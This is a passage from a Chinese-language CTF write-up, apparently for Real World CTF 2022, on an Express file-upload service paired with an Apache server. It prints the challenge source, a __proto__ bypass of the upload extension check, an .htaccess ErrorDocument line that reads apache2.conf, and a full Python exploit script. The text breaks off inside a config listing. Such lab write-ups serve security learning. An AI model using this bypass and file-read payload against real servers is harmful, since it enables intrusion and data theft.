<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">$ curl 127.0.0.1:31337/source | <span class="built_in">tee</span> code.js</span><br><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const fileUpload = require(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line">const md5 = require(<span class="string">&#x27;md5&#x27;</span>);</span><br><span class="line">const &#123; v4: uuidv4 &#125; = require(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line">const check = require(<span class="string">&#x27;./check&#x27;</span>); // 这里引入了 check 不知道是什么 但是是自定义的</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const PORT = 8000;</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, __dirname + <span class="string">&#x27;/views&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(fileUpload(&#123;</span><br><span class="line">  useTempFiles : <span class="literal">true</span>,</span><br><span class="line">  tempFileDir : <span class="string">&#x27;/tmp/&#x27;</span>,</span><br><span class="line">  createParentPath : <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/upload&#x27;</span>,check()); // 这里调用了 check 应该是 在 ./check 的一个函数</span><br><span class="line"></span><br><span class="line">// 看到 这里用到了下面用到了 获取源码的方法</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span>(req, res) &#123; </span><br><span class="line">  <span class="keyword">if</span> (req.query.checkin)&#123; // 让 checkin == 1 </span><br><span class="line">    res.sendfile(<span class="string">&#x27;/src/check.js&#x27;</span>); // 这里我们可以猜测之前 check 的意思 应该就是这个文件</span><br><span class="line">    							// 因此接下来我们要请求拿一下 check.js 但是不急 我们接着看</span><br><span class="line">  &#125;</span><br><span class="line">  res.sendfile(<span class="string">&#x27;/src/server.js&#x27;</span>); // 就是我们当前的文件</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 我们的根目录 生成了一个 formid</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(req, res) &#123;</span><br><span class="line">  var formid = <span class="string">&quot;form-&quot;</span> + uuidv4();</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123;formid : formid&#125; );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 这里是上传点  一般这里大家都会警觉</span><br><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, <span class="keyword">function</span>(req, res) &#123;</span><br><span class="line">  <span class="built_in">let</span> sampleFile;</span><br><span class="line">  <span class="built_in">let</span> uploadPath;</span><br><span class="line">  <span class="built_in">let</span> userdir;</span><br><span class="line">  <span class="built_in">let</span> userfile;</span><br><span class="line">  // 样本文件 获取 用的是 req.query.formid 注意可以是数字 不一定是 字符串</span><br><span class="line">  sampleFile = req.files[req.query.formid];</span><br><span class="line">  // 这里处理 文件 <span class="built_in">hash</span> 用的 md5 分别计算了 文件 <span class="built_in">hash</span> 和 上传者的地址</span><br><span class="line">  // node 会获取 ::ffff:&#123;ipv4&#125; 作为你的 ip 地址 </span><br><span class="line">  userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);</span><br><span class="line">  userfile = sampleFile.name.toString(); </span><br><span class="line">  // 文件名就是 name 字段 不是 filename 字段 正常情况是 你的 formid</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(userfile.includes(<span class="string">&#x27;/&#x27;</span>)||userfile.includes(<span class="string">&#x27;..&#x27;</span>))&#123; </span><br><span class="line">      <span class="built_in">return</span> res.status(500).send(<span class="string">&quot;Invalid file name&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  // 上传到的地址 注意这里是绝对地址 </span><br><span class="line">  uploadPath = <span class="string">&#x27;/uploads/&#x27;</span> + userdir + <span class="string">&#x27;/&#x27;</span> + userfile;</span><br><span class="line">  sampleFile.<span class="built_in">mv</span>(uploadPath, <span class="keyword">function</span>(err) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="built_in">return</span> res.status(500).send(err);</span><br><span class="line">    &#125;</span><br><span class="line">    // 这里提到了第二个端口 </span><br><span class="line">    // 这里也说明了 上传的文件你可以在这个地址访问到 </span><br><span class="line">    // 文件上传 getshell 基本都要用到 这个地址访问 然后让服务器执行</span><br><span class="line">    res.send(<span class="string">&#x27;File uploaded to http://47.243.75.225:31338/&#x27;</span> + userdir + <span class="string">&#x27;/&#x27;</span> + userfile);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;Express server listening on port &#x27;</span>, PORT);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3><span id="check-shen-ji">check 审计</span><a href="#check-shen-ji" class="header-anchor"></a></h3><p>接下来 看看我们的 check.js </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">31337</span>/source?checkin=<span class="number">1</span> | tee check.<span class="property">js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !req.<span class="property">query</span>.<span class="property">formid</span> || !req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 确认你有上传</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something error.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// 对每个文件的 key 进行检查 (其实这里有个例外 __proto__ 是个例外)</span></span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">key</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> filename = req.<span class="property">files</span>[key].<span class="property">name</span>.<span class="title function_">toLowerCase</span>(); </span><br><span class="line">        <span class="keyword">var</span> position = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (position == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">        &#125; <span class="comment">// 如果没有 . 就下一个文件 这里其实也有个 bypass 点位 也就是上传两个文件 用第一个 无后缀的安全文件 bypass </span></span><br><span class="line">        <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(position);</span><br><span class="line">        <span class="keyword">var</span> allowexts = [<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>,<span class="string">&#x27;.html&#x27;</span>,<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.xhtml&#x27;</span>,<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&#x27;.realworld&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !allowexts.<span class="title function_">includes</span>(ext) )&#123; <span class="comment">// 确认安全文件名后缀</span></span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something error.&#x27;</span>);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">next</span>(); <span class="comment">// 所有检查完毕后 就 返回下一个文件</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3><span id="kan-yi-yan-31338-duan-kou">看一眼 31338 端口</span><a href="#kan-yi-yan-31338-duan-kou" class="header-anchor"></a></h3><p>这里可以看一眼 31338 端口 然后 curl 一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ curl 127.0.0.1:31338 -v</span><br><span class="line">*   Trying 127.0.0.1:31338...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 31338 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:31338</span><br><span class="line">&gt; User-Agent: curl/7.81.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 27 Jan 2022 15:48:27 GMT</span><br><span class="line">&lt; Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">&lt; Last-Modified: Thu, 20 Jan 2022 09:18:15 GMT</span><br><span class="line">&lt; ETag: <span class="string">&quot;31-5d5fffb6aa3c0&quot;</span></span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Content-Length: 49</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br><span class="line">Welcome to my CDN! Execute /readflag to get flag.  </span><br></pre></td></tr></table></figure>

<p>这里就是个 普通 apache 而上面的两个 则是 Express </p>
<h2><span id="si-lu-he-li-yong">思路和利用</span><a href="#si-lu-he-li-yong" class="header-anchor"></a></h2><p>既然上传这里 有问题 那么就试试上传 看看能不能弄到点什么</p>
<p>很显然 getshell 的任何 php pl 脚本代码都是不能成功利用的 就是个 简简单单的 纯纯的 Apache 服务器 </p>
<h3><span id="di-yi-bu-fen">第一部分</span><a href="#di-yi-bu-fen" class="header-anchor"></a></h3><p>既然是 apache 目标, 自然 <a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html">.htaccess</a> apache.conf 这种配置文件 很显然就变成了我们的目标</p>
<blockquote>
<p>你或许以为直接 cgi script 进行一把梭就完事了 很显然 这里服务器 默认是没有开启的 (因为他是 docker 而且几乎是默认的 apache )</p>
</blockquote>
<p>既然是 Apache 那么翻翻 apache 文档</p>
<h4><span id="errordocument">ErrorDocument</span><a href="#errordocument" class="header-anchor"></a></h4><p>知识点 1 <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument">ErrorDocument</a> 错误文档 可以看到 context 运行上下文的中存在 .htaccess</p>
<p>可以这样利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 %&#123;file:/etc/apache2/apache2.conf&#125;</span><br></pre></td></tr></table></figure>

<p>保存为 .htaccess 然后传上去</p>
<p>无用的知识点 <a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog">ErrorLog</a> 也能执行命令 但是很显然 上下文环境阻止了你  这里其实可以拿来出题 哈哈哈</p>
<p>同样 </p>
<ul>
<li><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_log_config.html#customlog">customlog</a> </li>
<li><a href="https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#globallog">globallog</a></li>
<li><a href="https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_forensic.html#forensiclog">forensiclog</a></li>
<li><a href="https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#transferlog">transferlog</a></li>
</ul>
<p>都具有 pipe 形式</p>
<p>滥用 htaccess 以及其中一些模块的方法 <a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></p>
<blockquote>
<p>额外找到了一些 相关的利用方法 </p>
<p>SetEnv LD_PERLOAD</p>
<p><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
</blockquote>
<h4><span id="shang-chuan-wen-jian">上传文件</span><a href="#shang-chuan-wen-jian" class="header-anchor"></a></h4><p>这里直接贴代码 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">target_render_port = <span class="number">31338</span></span><br><span class="line">target_upload_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">upload_file = <span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">normal_file = <span class="string">&quot;a.txt&quot;</span></span><br><span class="line"></span><br><span class="line">request_sender_ip = <span class="string">&quot;172.18.0.1&quot;</span> </span><br><span class="line">request_ip = <span class="string">&quot;::ffff:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(request_sender_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是为了好看 跟踪一下请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_request</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;request form&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.request.method, response.request.url)</span><br><span class="line">    <span class="keyword">for</span> header_key <span class="keyword">in</span> response.request.headers.keys():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(header_key, response.request.headers[header_key]))</span><br><span class="line">    body = response.request.body</span><br><span class="line">    <span class="keyword">if</span> body == <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>( body.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_response</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;response form&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code, response.url)</span><br><span class="line">    <span class="keyword">for</span> header_key <span class="keyword">in</span> response.headers.keys():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(header_key, response.headers[header_key]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(string.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算上传点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_upload_path</span>(<span class="params">upload_file, form_id </span>): <span class="comment"># form_id 是无用的 无所谓传什么</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # 对应的 js 代码</span></span><br><span class="line"><span class="string">    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);</span></span><br><span class="line"><span class="string">    userfile = sampleFile.name.toString();</span></span><br><span class="line"><span class="string">    if(userfile.includes(&#x27;/&#x27;)||userfile.includes(&#x27;..&#x27;))&#123;</span></span><br><span class="line"><span class="string">      return res.status(500).send(&quot;Invalid file name&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    uploadPath = &#x27;/uploads/&#x27; + userdir + &#x27;/&#x27; + userfile;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    file_md5 = hashlib.md5(<span class="built_in">open</span>(upload_file,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    userdir  = md5(md5(request_ip)+file_md5)</span><br><span class="line">    userfile = form_id <span class="comment"># 这里其实无用 </span></span><br><span class="line">    <span class="comment"># upload_path = &#x27;/uploads/&#x27; + userdir + &#x27;/&#x27; + userfile # the realworld ctf Env</span></span><br><span class="line">    upload_path = <span class="string">&#x27;/&#x27;</span> + userdir + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> upload_path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="comment">## STEP 1 get formid if you need</span></span><br><span class="line">    uplaod_url1 = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;/&quot;</span>.<span class="built_in">format</span>(target_ip, target_upload_port)</span><br><span class="line">    r = requests.get(uplaod_url1)</span><br><span class="line">    form_id = r.text.split(<span class="string">&quot;action=&#x27;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    real_form_id = form_id.split(<span class="string">&#x27;/upload?formid=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;you should use this id: &quot;</span>,real_form_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## STEP 2 upload error file</span></span><br><span class="line">    <span class="comment"># 方法 1 多文件上传绕过</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # real_form_id = upload_file</span></span><br><span class="line"><span class="string">    upload_url2 = &quot;http://&#123;&#125;:&#123;&#125;/upload?formid=&#123;&#125;&quot;.format(target_ip,target_upload_port,real_form_id)</span></span><br><span class="line"><span class="string">    upload_file_id = real_form_id</span></span><br><span class="line"><span class="string">    files = &#123;</span></span><br><span class="line"><span class="string">            real_form_id : open(normal_file,&#x27;r&#x27;),</span></span><br><span class="line"><span class="string">            real_form_id : open(upload_file,&#x27;r&#x27;),</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    # need uplaod 2 same name file as bad request </span></span><br><span class="line"><span class="string">    # 可以这么发包 塞入两个文件 但是很显然 这里前一个文件会被后一个文件盖掉 </span></span><br><span class="line"><span class="string">    # 倒是强行可以通过 自己定义写多部分 来进行上传 但是代码复用度不好</span></span><br><span class="line"><span class="string">    # 所以你会发现 你最后只上传了一个文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 方法 2 proto 大魔法</span></span><br><span class="line">    upload_url2 = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;/upload?formid=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target_ip,target_upload_port,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: <span class="built_in">open</span>(upload_file,<span class="string">&quot;r&quot;</span>), </span><br><span class="line">        <span class="string">&quot;decoy&quot;</span>:(<span class="string">&quot;decoy&quot;</span>,<span class="string">&quot;random&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    原理参照一个小哥 在 discord 中发的内容: 如下</span></span><br><span class="line"><span class="string">    the __proto__ file is not checked because Object.keys does not include properties from the prototype, </span></span><br><span class="line"><span class="string">    but since the prototype is now an array we can use formid=1 to access that file again in the upload function</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r2 = requests.post(upload_url2,files=files)</span><br><span class="line">    print_request(r2)</span><br><span class="line">    print_response(r2)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## STEP 3 get the response</span></span><br><span class="line">    access_path = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target_ip,target_render_port) + \</span><br><span class="line">            calc_upload_path(upload_file,real_form_id) + <span class="string">&quot;NonExistFile&quot;</span> </span><br><span class="line">    <span class="comment"># 强行 在这个目录下 404</span></span><br><span class="line">    r3 = requests.get(access_path)</span><br><span class="line">    print_request(r3)</span><br><span class="line">    print_response(r3)</span><br><span class="line">    <span class="comment">## 如果这里你的 .htaccess 文件 成功上传了 就会在这里 拿到 你 .htaccess 文件 ErrorDocument 指向的文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3><span id="di-er-bu-fen">第二部分</span><a href="#di-er-bu-fen" class="header-anchor"></a></h3><h4><span id="apache2-conf-shen-ji">apache2.conf审计</span><a href="#apache2-conf-shen-ji" class="header-anchor"></a></h4><blockquote>
<p> 文件很长 可以直接拉到最后 看</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 